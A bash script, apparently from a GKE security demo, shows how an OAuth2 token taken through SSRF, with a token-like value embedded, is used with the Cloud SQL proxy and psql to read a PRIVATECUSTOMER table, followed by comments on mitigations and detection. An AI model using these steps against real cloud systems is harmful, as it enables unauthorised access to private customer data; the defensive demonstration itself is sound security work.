#!/bin/bash

# We assume that the attacker has recon'd the below 3 params. Very likely by reading pod $env
#export PROJECT_ID='xxxxx'
#export SQL_DATABASE_ID='storm-cloud-sqldb'
#export SQL_INSTANCE_ID='storm-cloud-sql'

# we need to again grab the OAuth2 token via the SSRF (Server Side Request Forgery) attack from the GKE cluster
#export TOKEN="ya29.c.c0ASRK0GZ3WU7XlEk7UJJcELmnCyaSXk7y1pAmkF_brtdWTyEhnbSO9e68pphuMbjNHZ0dJqlPR_dzshfFZFFBDpQ2yGQ0zY8wOEscToYiM1cxxRDhCXF_kdv51aIdoJuGu4MG5Jx1VbDCw-_8aXKCEaDaYUzH76_pJkpZ82S4YpEZJNHq2hsBbo_-p-sIEZtgamSElQH5SIuAVVQ0uD_zNEpIsQTasPHkHnL-ishdQStSNKwCaSgWJOBrCOW-LJnV_CCOj4AobYWYLTUXRPrLrWKJ_fEPWqAnGSYYU1B6guusEe48utsql1pNsZ97RlOCVMarxuTmtLU7t_yNhTtXsmr0PzGmjiFGnkbwps8qtDxd8JXKqGiFQhxTnDior-jLpMuyR7UzL6FIHY6ovRb5XVQhyofDwjs9MhDfVxW1ZVgRhbDUrjaXNZcFrElSdxIoDFQshGjg6T3VBJ0p_D5DjezxjssyRTT_4fK80GUvvOWwB95H5ByDoCxJHPPs6ruyzBeNsUcqdqid9Hwc51VcuQ8sbdl9V3mnreYVNYnJ0f_Qt3PC9j_9XMxcoYpIS8ENaTDReChIBMeXh20uMoT3YoCJCncWZYuje7zkkbEeLXv7Gbq02-BdN637DO2bqYgqUulcfnkt0uoimsXw4_w3UYX2XwB2i185_mq2Xuq0JW4cs7eh-56IkgrnankWZvrdzzFle6ciXOaoB7aMu0dvwt--wUaZtYSgtdF29y_BoOhzh7n6zzbXb3UgWj3yx0nZauxcSp29b9g5pryFzRJqaqhIp1x0hYX1w9OnsO7gFYsrmi7F8SuhQwu1Mr1wZhchIBFr9Wkbnqmw9u3_gI4IgMU02IZhfB3BIBhjhbR_9s16BjzBrhseBRwXR958vze4hSoYrtI3Fz_vt5a4uBy_XOw5qIdY5Mm3iW6Z8brR_bbMFl5WB4gFz1iII1c3eetsx4vlgmIbVc0UoFdm6OR1yzrxivew4wjFkcXh17fISYpS22BcVvRbbZ-" Use the offical GCP PROXY to tunnel to the SQL_DB:  https://cloud.google.com/sql/docs/postgres/connect-auth-proxy#docker-unix
#curl -o cloud-sql-proxy https://storage.googleapis.com/cloud-sql-connectors/cloud-sql-proxy/v2.13.0/cloud-sql-proxy.darwin.arm64
#chmod +x cloud-sql-proxy
# Now we can use the OAUTH_TOKEN as Bearer to read the Data 
./cloud-sql-proxy --token ${TOKEN} ${PROJECT_ID}:europe-west1:${SQL_INSTANCE_ID}
PGPASSWORD=${TOKEN} psql "sslmode=disable host=127.0.0.1 port=5432 user=pacman-rancher@${PROJECT_ID}.iam dbname=${SQL_DATABASE_ID}"
  
SELECT * from PRIVATECUSTOMER;

# Mitigations: in order for this attack to work, the attacker must be in a network range where the SQL-DB is accessible from 
# If the SSRF is severe, it may allow the attacker to proxy/tunnel to the SQL-DB through GKE itself.
# We assume here, that the network is not properly segmented and the SQL-DB is accessible from our laptop.
# So mitigation 1 is defense in depth by using proper network segmentation
# Mitigation 2: Restrict access to the metadata api of GKE to only those pods that really need it, 
# This can be achieved by a) avoiding identity sameness b) kubernetes network policies for application pods c) ensuring KSA (Kubernetes Service Account) and GSA (Google Service Account) are used per-pod per-purpose and have individual iam role bindings
# However: none of the above guarantees that the tokens cant be leaked, so DETECTION and ALERTING is key.
# Having audit logs on the database and metadata-api-server logs for correlation is required for 100% true positive breach detection.
# Another good idea is to limit the use of federated identity in general to only services that need passwords
# A more elaborate mitigation is to use SPIFFE (Secure Production Identity Framework For Everyone) to ensure that the identity of the pod is unique and a stolen token can only be used by the pod that it was minted for.




#export DECRYPT="https://cloudkms.googleapis.com/v1/projects/${PROJECT_ID}/locations/europe-west1/keyRings/gke${PROJECT_ID}/cryptoKeys/gke:decrypt"



